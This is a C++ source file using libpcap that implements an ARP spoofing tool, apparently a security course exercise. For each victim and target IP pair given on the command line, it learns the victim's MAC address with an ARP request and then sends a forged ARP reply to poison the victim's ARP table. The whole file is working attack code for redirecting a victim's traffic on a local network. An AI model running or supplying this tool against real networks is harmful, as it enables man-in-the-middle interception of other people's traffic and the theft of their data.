#include "main.h"

int main(int argc, char *argv[])
{
	// parameter check
	if (argc < 4 || (argc % 2) != 0)
	{
		usage();
		return -1;
	}
	// for multiple execution
	int iter;
	for (iter = 2; iter <= argc-1; iter += 2)
	{
		printf("ARP SEND..\n\n");
		char *dev = argv[1];
		const char *interfaceName = argv[1];
		// Collecting info for ARP packet
		unsigned char src_mac[6];
		if (getMACAddress(interfaceName, src_mac) == 0)
		{
			printf("src MAC : %02X:%02X:%02X:%02X:%02X:%02X\n",
					src_mac[0], src_mac[1], src_mac[2],
					src_mac[3], src_mac[4], src_mac[5]);
		}
		else
		{
			printf("Failed to get MAC Address.\n");
		}

		 char src_ip[INET_ADDRSTRLEN];
		if (getIPAddress(interfaceName, src_ip) == 0)
		{
			printf("src IP : %s\n",src_ip);
		}
		else
		{
			printf("Failed to get IP address.\n");
		}

		// Send ARP Request packet for dst_mac(victim MAC address)
		char errbuf[PCAP_ERRBUF_SIZE];
		pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
		if (handle == nullptr)
		{
			fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
			return -1;
		}
		EthArpPacket packet;

		packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
		packet.eth_.smac_ = Mac(src_mac);
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.smac_ = Mac(src_mac);
		packet.arp_.sip_ = htonl(Ip(src_ip));
		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
		packet.arp_.tip_ = htonl(Ip(argv[iter]));

		int res1 = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));

		if (res1 != 0)
		{
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res1, pcap_geterr(handle));
		}
		char dst_mac[ETH_ALEN];

		// Receiving reply packet and extract victim's MAC address
		while (true)
		{
			struct pcap_pkthdr *header;
			const u_char *reply_packet;
			int result = pcap_next_ex(handle, &header, &reply_packet);
			if (result != 1)
			{
				continue;
			}
			EthArpPacket *reply = (EthArpPacket *)reply_packet;

			if (ntohs(reply->eth_.type_) == EthHdr::Arp && ntohs(reply->arp_.op_) == ArpHdr::Reply &&
				reply->arp_.sip_ == packet.arp_.tip_ && reply->arp_.tip_ == packet.arp_.sip_)
			{
				strcpy(dst_mac, std::string(reply->arp_.smac_).c_str());
				break;
			}
		}

		printf("dst MAC : %s\n", dst_mac);
		printf("dst IP : %s\n", argv[iter]);

		// Send ARP Reply packet to falsify victim(sender)'s ARP table
		packet.eth_.dmac_ = Mac(dst_mac);
		packet.eth_.smac_ = Mac(src_mac);
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Reply);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;

		packet.arp_.smac_ = Mac(src_mac);
		packet.arp_.sip_ = htonl(Ip(argv[iter+1]));
		packet.arp_.tmac_ = Mac(dst_mac);
		packet.arp_.tip_ = htonl(Ip(argv[iter]));

		int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
		if (res2 != 0)
		{
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
		}

		pcap_close(handle);
	}
	printf("\n------------------------------\n");
}
